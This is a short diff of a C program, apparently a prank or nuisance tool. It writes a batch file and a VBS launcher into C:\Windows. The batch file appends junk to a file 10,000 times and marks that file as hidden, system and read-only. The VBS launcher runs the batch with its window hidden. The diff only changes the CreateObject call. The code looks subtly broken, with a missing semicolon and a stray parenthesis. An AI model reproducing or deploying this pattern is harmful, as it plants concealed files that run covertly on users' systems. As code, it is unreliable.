@@ -19,6 +19,6 @@ int main(){
 	file=fopen("C:\\Windows\\test.bat","w");
 	fprintf(file,"@echo off\nset i=0\nattrib -s -h -r out\n:start\nset /a i+=1\nif %%i%%==10000 goto t\necho 1145141919810 >>out\ngoto start\n:t\nattrib +s +h +r out\nexit");
 	file=fopen("C:\\Windows\\test.vbs","w");
-	fprintf(file,"Set sh=WScript.CreateObject(\"wscript.shell\")\nsh.run \"test.bat\",SW_HIDE)")
+	fprintf(file,"Set sh=CreateObject(\"wscript.shell\")\nsh.run \"test.bat\",SW_HIDE)")
 	exit(114514);
 }
